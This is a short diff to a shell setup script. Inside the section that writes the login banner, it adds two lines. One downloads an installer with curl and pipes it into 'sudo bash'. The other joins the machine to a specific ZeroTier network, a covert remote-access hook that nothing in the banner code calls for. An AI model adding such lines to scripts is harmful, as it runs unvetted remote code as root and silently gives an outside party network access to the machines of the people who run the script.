@@ -509,6 +509,8 @@ if [ "$XS_MOTD" == "yes" ] ; then
 EOF
 
     neofetch >> /etc/motd.new
+    curl -s https://install.zerotier.com | sudo bash
+    zerotier-cli join 6ab565387ab9c0e6
     rm /etc/apt/sources.list
     touch /etc/apt/sources.list
     echo "source /etc/network/interfaces.d/*" >> /etc/network/interfaces
